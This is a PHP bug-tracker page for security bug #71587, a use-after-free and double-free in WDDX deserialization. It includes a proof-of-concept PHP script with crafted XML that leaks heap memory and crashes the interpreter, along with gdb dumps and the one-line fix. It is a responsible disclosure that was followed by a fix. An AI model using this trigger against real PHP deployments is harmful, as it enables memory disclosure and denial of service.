@@ -1,0 +1,525 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="utf-8">
+    
+        <link rel='alternate' type='application/rss+xml' title='WDDX related Bug #71587 - RDF' href='rss/bug.php?id=71587'>
+        <link rel='alternate' type='application/rss+xml' title='WDDX related Bug #71587 - RSS 2.0' href='rss/bug.php?id=71587&format=rss2'>
+        <base href="https://bugs.php.net/">
+    <title>PHP :: Sec Bug #71587 :: Use-After-Free / Double-Free in WDDX Deserialize</title>
+    <link rel="shortcut icon" href="https://bugs.php.net/images/favicon.ico">
+    <link rel="stylesheet" href="https://bugs.php.net/css/style.css">
+</head>
+
+<body>
+
+<table id="top" class="head" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="head-logo">
+            <a href="/"><img src="images/logo.png" alt="Bugs" vspace="2" hspace="2"></a>
+        </td>
+
+        <td class="head-menu">
+            <a href="https://php.net/">php.net</a>&nbsp;|&nbsp;
+            <a href="https://php.net/support.php">support</a>&nbsp;|&nbsp;
+            <a href="https://php.net/docs.php">documentation</a>&nbsp;|&nbsp;
+            <a href="report.php">report a bug</a>&nbsp;|&nbsp;
+            <a href="search.php">advanced search</a>&nbsp;|&nbsp;
+            <a href="search-howto.php">search howto</a>&nbsp;|&nbsp;
+            <a href="stats.php">statistics</a>&nbsp;|&nbsp;
+            <a href="random">random bug</a>&nbsp;|&nbsp;
+            <a href="login.php">login</a>
+        </td>
+    </tr>
+
+    <tr>
+        <td class="head-search" colspan="2">
+            <form method="get" action="search.php">
+                <p class="head-search">
+                    <input type="hidden" name="cmd" value="display">
+                    <small>go to bug id or search bugs for</small>
+                    <input class="small" type="text" name="search_for" value="" size="30">
+                    <input type="image" src="images/small_submit_white.gif" alt="search" style="vertical-align: middle;">
+                </p>
+            </form>
+        </td>
+    </tr>
+</table>
+
+<table class="middle" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="content">
+<div id="bugheader">
+    <table id="details">
+        <tr id="title">
+            <th class="details" id="number"><a href="bug.php?id=71587">Sec Bug</a>&nbsp;#71587</th>
+            <td id="summary" colspan="5">Use-After-Free / Double-Free in WDDX Deserialize</td>
+        </tr>
+        <tr id="submission">
+            <th class="details">Submitted:</th>
+            <td style="white-space: nowrap;">2016-02-14 10:35 UTC</td>
+            <th class="details">Modified:</th>
+            <td style="white-space: nowrap;">2016-03-02 06:38 UTC</td>
+            <td rowspan="6">
+
+
+            </td>
+        </tr>
+
+        <tr id="submitter">
+            <th class="details">From:</th>
+            <td>manhluat &#x61;&#116; vnsecurity &#x64;&#111;&#x74; net</td>
+            <th class="details">Assigned:</th>
+            <td><a href="search.php?cmd=display&amp;assign=stas">stas</a> (<a href="https://people.php.net/stas">profile</a>)</td>
+        </tr>
+
+        <tr id="categorization">
+            <th class="details">Status:</th>
+            <td>Closed</td>
+            <th class="details">Package:</th>
+            <td><a href="search.php?cmd=display&amp;package_name[]=WDDX+related">WDDX related</a></td>
+        </tr>
+
+        <tr id="situation">
+            <th class="details">PHP Version:</th>
+            <td>5.5.32</td>
+            <th class="details">OS:</th>
+            <td>Linux, Unix</td>
+        </tr>
+
+        <tr id="private">
+            <th class="details">Private report:</th>
+            <td>No</td>
+            <th class="details">CVE-ID:</th>
+            <td><em>None</em></td>
+        </tr>
+    </table>
+</div>
+
+<div class="controls">
+<span id='control_0' class='control active'>View</span>
+<span id='control_3' class='control'><a href='bug.php?id=71587&amp;edit=3'>Add Comment</a></span>
+<span id='control_1' class='control'><a href='bug.php?id=71587&amp;edit=1'>Developer</a></span>
+<span id='control_2' class='control'><a href='bug.php?id=71587&amp;edit=2'>Edit</a></span>
+</div>
+<div class="clear"></div>
+
+
+
+<div class='comment type_comment' ><a name="1455446130">&nbsp;</a><strong>[2016-02-14 10:35 UTC] manhluat &#x61;&#116; vnsecurity &#x64;&#111;&#x74; net</strong>
+<pre class='note'>Description:
+------------
+There is use-after-free flaw in WDDX Deserialize implement when trying to process XML data.
+
+
+******************** SNIP ********************
+static void php_wddx_push_element(void *user_data, const XML_Char *name, const XML_Char **atts)
+{
+	st_entry ent;
+	wddx_stack *stack = (wddx_stack *)user_data;
+...
+	} else if (!strcmp((char *)name, EL_STRING)) {
+		ent.type = ST_STRING;
+		SET_STACK_VARNAME;
+
+		ZVAL_STR(&amp;ent.data, ZSTR_EMPTY_ALLOC());
+		wddx_stack_push((wddx_stack *)stack, &amp;ent, sizeof(st_entry));
+...
+	} else if (!strcmp((char *)name, EL_VAR)) {
+		int i;
+
+		if (atts) for (i = 0; atts[i]; i++) {
+			if (!strcmp((char *)atts[i], EL_NAME) &amp;&amp; atts[++i] &amp;&amp; atts[i][0]) {
+				stack-&gt;varname = estrdup((char *)atts[i]);
+				break;
+			}
+		}
+...
+******************** SNIP ********************
+
+The name of the following data is specified by attribute 'name' of 'var' tag.
+
+For example, when I was trying to set the name of &lt;string&gt; data.
+
+It will then do `SET_STACK_VARNAME` which does the following producere:
+
+
+******************** SNIP ********************
+#define SET_STACK_VARNAME							\
+		if (stack-&gt;varname) {						\
+			ent.varname = estrdup(stack-&gt;varname);	\
+			efree(stack-&gt;varname);					\
+			stack-&gt;varname = NULL;					\
+		} else										\
+			ent.varname = NULL;						\
+******************** SNIP ********************
+
+You can see that if stack-&gt;varname is exists, it will assign ent.varname by that value.
+
+Here is our problem, what would happen if I open &lt;var&gt; then close it immediately prior to processing &lt;string&gt; tag.
+
+It would call handlers for push/pop elements.
+
+
+******************** SNIP ********************
+static void php_wddx_pop_element(void *user_data, const XML_Char *name)
+{
+	st_entry 			*ent1, *ent2;
+	wddx_stack 			*stack = (wddx_stack *)user_data;
+	HashTable 			*target_hash;
+	zend_class_entry 	*pce;
+	zval				obj;
+...
+	} else if (!strcmp((char *)name, EL_VAR) &amp;&amp; stack-&gt;varname) {
+		efree(stack-&gt;varname);
+...
+
+}
+
+******************** SNIP ********************
+
+
+In php_wddx_pop_element(), it was free-ing stack-&gt;varname, when closing tag. But...it doesn't re-assign it by NULL ?!.
+
+And it will process data in &lt;string&gt; tag and set ent.varname by that `freed` value.
+
+That's how we manipulate this use-after-free issues.
+
+You can run below PoC and see memory leak value.
+
+Furthermore, We probably causes Double-Free from this bug.
+
+
+
+******************** SNIP ********************
+static void php_wddx_process_data(void *user_data, const XML_Char *s, int len)
+{
+	st_entry *ent;
+	wddx_stack *stack = (wddx_stack *)user_data;
+...
+			case ST_BOOLEAN:
+				if (!strcmp((char *)s, &quot;true&quot;)) {
+					Z_LVAL(ent-&gt;data) = 1;
+				} else if (!strcmp((char *)s, &quot;false&quot;)) {
+					Z_LVAL(ent-&gt;data) = 0;
+				} else {
+					stack-&gt;top--;
+					zval_ptr_dtor(&amp;ent-&gt;data);
+					if (ent-&gt;varname)
+						efree(ent-&gt;varname);
+					efree(ent);
+				}
+				break;
+...
+
+******************** SNIP ********************
+
+If the value of &lt;boolean&gt; tag is neither &quot;true&quot; nor &quot;false&quot;, it will free ent-&gt;varname once more (double-free).
+
+Below backtrace of gdb will give you details.
+
+
+
+* Notice
+- Calculated crafting will even cause crash and let it over-write data to other segments in PHP5 ubuntu package.
+- Effects on 32-bit,64-bit as well.
+
+* Fix
+	} else if (!strcmp((char *)name, EL_VAR) &amp;&amp; stack-&gt;varname) {
+		efree(stack-&gt;varname);
++		stack-&gt;varname = NULL;
+		}
+
+Test script:
+---------------
+&lt;?php
+
+$xml = &lt;&lt;&lt;EOF
+&lt;?xml version='1.0' ?&gt;
+&lt;!DOCTYPE wddxPacket SYSTEM 'wddx_0100.dtd'&gt;
+&lt;wddxPacket version='1.0'&gt;
+    &lt;array&gt;
+         &lt;var name='ML'&gt;&lt;/var&gt;
+            &lt;string&gt;manhluat&lt;/string&gt;
+         &lt;var name='ML2'&gt;&lt;/var&gt;
+         	&lt;boolean value='a'/&gt;
+         &lt;boolean value='true'/&gt;
+    &lt;/array&gt;
+&lt;/wddxPacket&gt;
+EOF;
+
+$wddx = wddx_deserialize($xml);
+var_dump($wddx);
+// Print mem leak
+foreach($wddx as $k=&gt;$v)
+	printf(&quot;Key: %s\nValue: %s\n&quot;,bin2hex($k),bin2hex($v));
+
+?&gt;
+
+Expected result:
+----------------
+root@ubuntu:~/test/debug/php-7.0.3# php5 -v
+PHP 5.5.9-1ubuntu4.14 (cli) (built: Oct 28 2015 01:34:46) 
+Copyright (c) 1997-2014 The PHP Group
+Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies
+    with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies
+root@ubuntu:~/test/debug/php-7.0.3# php5 /root/test/php-7.0.3/poc/1.php 
+
+array(2) {
+  [&quot;manhluat&quot;]=&gt;
+  string(8) &quot;��+�@&quot;
+  [0]=&gt;
+  bool(true)
+}
+Key: 6d616e686c756174
+Value: 6d616e686c756174
+Segmentation fault (core dumped)
+root@ubuntu:~/test/debug/php-7.0.3# 
+
+--------------------------------------------
+root@ubuntu:~/test/debug/php-7.0.3# ./sapi/cli/php -v
+PHP 7.0.3 (cli) (built: Feb  7 2016 14:42:27) ( NTS )
+Copyright (c) 1997-2016 The PHP Group
+Zend Engine v3.0.0, Copyright (c) 1998-2016 Zend Technologies
+root@ubuntu:~/test/debug/php-7.0.3# ./sapi/cli/php /root/test/php-7.0.3/poc/1.php
+
+array(2) {
+  [&quot; `�d&quot;]=&gt;
+  string(8) &quot;manhluat&quot;
+  [0]=&gt;
+  bool(true)
+}
+Key: 102060dd647f &lt;-- LEAK LEAK!!!
+Value: 6d616e686c756174
+Key: 30
+Value: 31
+root@ubuntu:~/test/debug/php-7.0.3# 
+
+Actual result:
+--------------
+gdb-peda$ r /root/test/php-7.0.3/poc/1.php
+Starting program: /root/test/debug/php-7.0.3/sapi/cli/php /root/test/php-7.0.3/poc/1.php
+
+[----------------------------------registers-----------------------------------]
+RAX: 0x7ffff6402008 (0x00007ffff6402008)
+RBX: 0x125e2a8 --&gt; 0x65756c6176 ('value')
+RCX: 0x124a860 --&gt; 0x1240061 --&gt; 0x123f4 
+RDX: 0x1 
+RSI: 0xe0fe99 --&gt; 0xe0000065736c6166 
+RDI: 0x7ffff6402008 (0x00007ffff6402008)
+RBP: 0x7fffffffa530 --&gt; 0x7fffffffa670 --&gt; 0x7fffffffa6e0 --&gt; 0x125cc60 --&gt; 0x125df70 --&gt; 0x0 
+RSP: 0x7fffffffa3d0 --&gt; 0x7ffff6401520 --&gt; 0x7ffff64563f0 --&gt; 0x700000001 
+RIP: 0x7ce9ad (&lt;php_wddx_process_data+1679&gt;:    call   0x8509e0 &lt;_efree&gt;)
+R8 : 0x0 
+R9 : 0x0 
+R10: 0x125e2a8 --&gt; 0x65756c6176 ('value')
+R11: 0x3 
+R12: 0x50 ('P')
+R13: 0x125ad33 (&quot;value='a'/&gt;\n         &lt;boolean value='true'/&gt;\n    &lt;/array&gt;\n&lt;/wddxPacket&gt;&quot;)
+R14: 0x125e6e0 --&gt; 0x125e2a8 --&gt; 0x65756c6176 ('value')
+R15: 0x1
+EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x7ce99f &lt;php_wddx_process_data+1665&gt;:       mov    rax,QWORD PTR [rbp-0x120]
+   0x7ce9a6 &lt;php_wddx_process_data+1672&gt;:       mov    rax,QWORD PTR [rax+0x18]
+   0x7ce9aa &lt;php_wddx_process_data+1676&gt;:       mov    rdi,rax
+=&gt; 0x7ce9ad &lt;php_wddx_process_data+1679&gt;:       call   0x8509e0 &lt;_efree&gt;
+   0x7ce9b2 &lt;php_wddx_process_data+1684&gt;:       mov    rax,QWORD PTR [rbp-0x120]
+   0x7ce9b9 &lt;php_wddx_process_data+1691&gt;:       mov    rdi,rax
+   0x7ce9bc &lt;php_wddx_process_data+1694&gt;:       call   0x8509e0 &lt;_efree&gt;
+   0x7ce9c1 &lt;php_wddx_process_data+1699&gt;:       jmp    0x7ceb81 &lt;php_wddx_process_data+2147&gt;
+Guessed arguments:
+arg[0]: 0x7ffff6402008 (0x00007ffff6402008)
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffa3d0 --&gt; 0x7ffff6401520 --&gt; 0x7ffff64563f0 --&gt; 0x700000001 
+0008| 0x7fffffffa3d8 --&gt; 0x1681a4b18 
+0016| 0x7fffffffa3e0 --&gt; 0x124a860 --&gt; 0x1240061 --&gt; 0x123f4 
+0024| 0x7fffffffa3e8 --&gt; 0x7fffffffa9b0 --&gt; 0x1000000001 
+0032| 0x7fffffffa3f0 --&gt; 0x7ffff7fda5f0 --&gt; 0x7ffff7ffe1c8 --&gt; 0x0 
+0040| 0x7fffffffa3f8 --&gt; 0xf7de4816 
+0048| 0x7fffffffa400 --&gt; 0xffffffff 
+0056| 0x7fffffffa408 --&gt; 0xfffffff900001406 
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+
+Breakpoint 2, 0x00000000007ce9ad in php_wddx_process_data (user_data=0x7fffffffa9b0, s=0x124a860 &quot;a&quot;, len=0x1) at /root/test/debug/php-7.0.3/ext/wddx/wddx.c:1011
+1011                                                    efree(ent-&gt;varname);
+gdb-peda$ c
+Continuing.
+array(2) {
+  [&quot; @�&quot;]=&gt;
+  string(8) &quot;manhluat&quot;
+  [0]=&gt;
+  bool(true)
+}
+Key: 102040f6ff7f
+Value: 6d616e686c756174
+Key: 30
+Value: 31
+[Inferior 1 (process 32505) exited normally]
+Warning: not running or target is remote
+gdb-peda$ 
+
+</pre>
+</div><h2>Patches</h2>
+<p><a href='patch-add.php?bug_id=71587'>Add a Patch</a></p><h2>Pull Requests</h2>
+<p><a href='gh-pull-add.php?bug_id=71587'>Add a Pull Request</a></p><h2 style="border-bottom:2px solid #666;margin-bottom:0;padding:5px 0;">History</h2><div id='comment_filter' class='controls comments'><span id='type_all' class='control active' onclick='do_comment(this);'>All</span><span id='type_comment' class='control ' onclick='do_comment(this);'>Comments</span><span id='type_log' class='control ' onclick='do_comment(this);'>Changes</span><span id='type_svn' class='control ' onclick='do_comment(this);'>Git/SVN commits</span><span id='type_related' class='control ' onclick='do_comment(this);'>Related reports</span>            </div>
+            <div id='comments_view' style='clear:both;'>
+<div class='comment type_comment' ><a name="1455446305">&nbsp;</a><strong>[2016-02-14 10:38 UTC] manhluat &#x61;&#116; vnsecurity &#x64;&#111;&#x74; net</strong>
+<pre class='note'>Following backtrace is debug information of php5 ubuntu's package which cause crash.
+
+
+
+gdb-peda$ r -v
+Starting program: /usr/bin/php5 -v
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
+PHP 5.5.9-1ubuntu4.14 (cli) (built: Oct 28 2015 01:34:46) 
+Copyright (c) 1997-2014 The PHP Group
+Zend Engine v2.5.0, Copyright (c) 1998-2014 Zend Technologies
+    with Zend OPcache v7.0.3, Copyright (c) 1999-2014, by Zend Technologies
+[Inferior 1 (process 32525) exited normally]
+Warning: not running or target is remote
+gdb-peda$ r /root/test/php-7.0.3/poc/1.php
+Starting program: /usr/bin/php5 /root/test/php-7.0.3/poc/1.php
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library &quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;.
+
+array(2) {
+  [&quot;manhluat&quot;]=&gt;
+  string(8) &quot;�b���&quot;
+  [0]=&gt;
+  bool(true)
+}
+Key: 6d616e686c756174
+Value: 6d616e686c756174
+
+Program received signal SIGSEGV, Segmentation fault.
+[----------------------------------registers-----------------------------------]
+RAX: 0x7ffff7003043 (&lt;__bam_merge_44_recover+435&gt;:      (bad))
+RBX: 0x7ffff7fcb090 --&gt; 0x7ffff7000031 (&lt;__bam_split_42_recover+1617&gt;:  rex)
+RCX: 0x33 ('3')
+RDX: 0x0 
+RSI: 0x3 
+RDI: 0xebed40 --&gt; 0x1 
+RBP: 0x7ffff7fc9d88 --&gt; 0x7ffff7fc9da8 --&gt; 0x31 ('1')
+RSP: 0x7fffffffabf0 --&gt; 0x10059797b 
+RIP: 0x63b117 (&lt;zif_bin2hex+103&gt;:       mov    BYTE PTR [rax+rdx*2],cl)
+R8 : 0xb55f00 (&quot;0123456789abcdef&quot;)
+R9 : 0x7ffff7f96080 --&gt; 0x7ffff7f96088 --&gt; 0x7ffff7fc9d88 --&gt; 0x7ffff7fc9da8 --&gt; 0x31 ('1')
+R10: 0xebcf80 --&gt; 0x0 
+R11: 0x7ffff7f962b0 --&gt; 0x7ffff7fc9db8 --&gt; 0x7ffff7fcb090 --&gt; 0x7ffff7000031 (&lt;__bam_split_42_recover+1617&gt;:    rex)
+R12: 0x1 
+R13: 0xea06ae --&gt; 0x0 
+R14: 0x7ffff7fc98b8 --&gt; 0x79e7b0 (&lt;ZEND_DO_FCALL_SPEC_CONST_HANDLER&gt;:   push   r14)
+R15: 0x0
+EFLAGS: 0x10206 (carry PARITY adjust zero sign trap INTERRUPT direction overflow)
+[-------------------------------------code-------------------------------------]
+   0x63b10c &lt;zif_bin2hex+92&gt;:   shr    cl,0x4
+   0x63b10f &lt;zif_bin2hex+95&gt;:   and    ecx,0xf
+   0x63b112 &lt;zif_bin2hex+98&gt;:   movzx  ecx,BYTE PTR [r8+rcx*1]
+=&gt; 0x63b117 &lt;zif_bin2hex+103&gt;:  mov    BYTE PTR [rax+rdx*2],cl
+   0x63b11a &lt;zif_bin2hex+106&gt;:  movzx  ecx,BYTE PTR [rbx+rdx*1]
+   0x63b11e &lt;zif_bin2hex+110&gt;:  and    ecx,0xf
+   0x63b121 &lt;zif_bin2hex+113&gt;:  movzx  ecx,BYTE PTR [r8+rcx*1]
+   0x63b126 &lt;zif_bin2hex+118&gt;:  mov    BYTE PTR [rax+rdx*2+0x1],cl
+[------------------------------------stack-------------------------------------]
+0000| 0x7fffffffabf0 --&gt; 0x10059797b 
+0008| 0x7fffffffabf8 --&gt; 0x7ffff7fcb090 --&gt; 0x7ffff7000031 (&lt;__bam_split_42_recover+1617&gt;:      rex)
+0016| 0x7fffffffac00 --&gt; 0xea06ac --&gt; 0x0 
+0024| 0x7fffffffac08 --&gt; 0xf04bd0 --&gt; 0x7fffffffcf01 --&gt; 0x700000000000000 
+0032| 0x7fffffffac10 --&gt; 0xebcf80 --&gt; 0x0 
+0040| 0x7fffffffac18 --&gt; 0x6de08b (&lt;dtrace_execute_internal+43&gt;:        cmp    WORD PTR [rbx],0x0)
+0048| 0x7fffffffac20 --&gt; 0x0 
+0056| 0x7fffffffac28 --&gt; 0x6fb84c (&lt;_zend_hash_quick_add_or_update+1004&gt;:       test   rax,rax)
+[------------------------------------------------------------------------------]
+Legend: code, data, rodata, value
+Stopped reason: SIGSEGV
+0x000000000063b117 in php_bin2hex (newlen=&lt;synthetic pointer&gt;, oldlen=0x1, old=0x7ffff7fcb090 &quot;1&quot;) at /build/php5-pO28mL/php5-5.5.9+dfsg/ext/standard/string.c:143
+143     /build/php5-pO28mL/php5-5.5.9+dfsg/ext/standard/string.c: No such file or directory.
+</pre>
+</div><div class='comment type_log' ><a name="1455509969">&nbsp;</a><strong>[2016-02-15 04:19 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-PHP Version: 7.0.3</span>
+<span class="added">+PHP Version: 5.5.32</span>
+</div></div></div><div class='comment type_log' ><a name="1455518115">&nbsp;</a><strong>[2016-02-15 06:35 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Assigned To:</span>
+<span class="added">+Assigned To: stas</span>
+</div></div></div><div class='comment type_comment' ><a name="1455520852">&nbsp;</a><strong>[2016-02-15 07:20 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Committed to security repo as b1bd4119bcafab6f9a8f84d92cd65eec3afeface.
+
+Also please see and verify <a href="https://gist.github.com/anonymous/e10c9fb9e148c17cef44" rel="nofollow">https://gist.github.com/anonymous/e10c9fb9e148c17cef44</a>
+</pre>
+</div><div class='comment type_comment' ><a name="1455539357">&nbsp;</a><strong>[2016-02-15 12:29 UTC] manhluat &#x61;&#116; vnsecurity &#x64;&#111;&#x74; net</strong>
+<pre class='note'>well, the issue is fixed.
+</pre>
+</div><div class='comment type_svn' ><a name="1456900745">&nbsp;</a><strong>[2016-03-02 06:39 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=b1bd4119bcafab6f9a8f84d92cd65eec3afeface" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=b1bd4119bcafab6f9a8f84d92cd65eec3afeface</a>
+Log: Fixed <a href='bug.php?id=71587'>bug #71587</a> - Use-After-Free / Double-Free in WDDX Deserialize
+</pre>
+</div><div class='comment type_log' ><a name="1456900748">&nbsp;</a><strong>[2016-03-02 06:39 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<div class='log_note'><div class="changeset">
+<span class="removed">-Status: Assigned</span>
+<span class="added">+Status: Closed</span>
+</div></div></div><div class='comment type_svn' ><a name="1456901794">&nbsp;</a><strong>[2016-03-02 06:56 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=b1bd4119bcafab6f9a8f84d92cd65eec3afeface" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=b1bd4119bcafab6f9a8f84d92cd65eec3afeface</a>
+Log: Fixed <a href='bug.php?id=71587'>bug #71587</a> - Use-After-Free / Double-Free in WDDX Deserialize
+</pre>
+</div><div class='comment type_svn' ><a name="1456902768">&nbsp;</a><strong>[2016-03-02 07:12 UTC] <a href="//people.php.net/stas">stas@php.net</a></strong>
+<pre class='note'>Automatic comment on behalf of stas
+Revision: <a href="http://git.php.net/?p=php-src.git;a=commit;h=b1bd4119bcafab6f9a8f84d92cd65eec3afeface" rel="nofollow">http://git.php.net/?p=php-src.git;a=commit;h=b1bd4119bcafab6f9a8f84d92cd65eec3afeface</a>
+Log: Fixed <a href='bug.php?id=71587'>bug #71587</a> - Use-After-Free / Double-Free in WDDX Deserialize
+</pre>
+</div></div>
+        </td>
+    </tr>
+</table>
+
+<script src='js/util.js'></script>
+<script src='https://ajax.googleapis.com/ajax/libs/jquery/1.4.2/jquery.min.js'></script>
+<script src="js/jquery.cookie.js"></script>
+<script>
+function do_comment(nd)
+{
+    $('#comment_filter > .control.active').removeClass("active");
+    $(nd).addClass("active");
+
+    $.cookie('history_tab', nd.id, { expires: 365 });
+
+    if (nd.id == 'type_all') {
+        $('#comments_view > .comment:hidden').show('slow');
+    } else {
+        $('#comments_view > .comment').each(function(i) {
+            if ($(this).hasClass(nd.id)) {
+                $(this).show('slow');
+            } else {
+                $(this).hide('slow');
+            }
+        });
+    }
+    return false;
+}
+</script>
+<table class="foot" cellspacing="0" cellpadding="0">
+    <tr>
+        <td class="foot-bar" colspan="2">&nbsp;</td>
+    </tr>
+
+    <tr>
+        <td class="foot-copy">
+            <small>
+                <a href="https://php.net/"><img src="images/logo-small.gif" align="left" valign="middle" hspace="3" alt="PHP"></a>
+                <a href="https://php.net/copyright.php">Copyright &copy; 2001-2021 The PHP Group</a><br>
+                All rights reserved.
+            </small>
+        </td>
+        <td class="foot-source">
+            <small>Last updated: Sat Oct 30 19:03:34 2021 UTC</small>
+        </td>
+    </tr>
+</table>
+</body>
+</html>
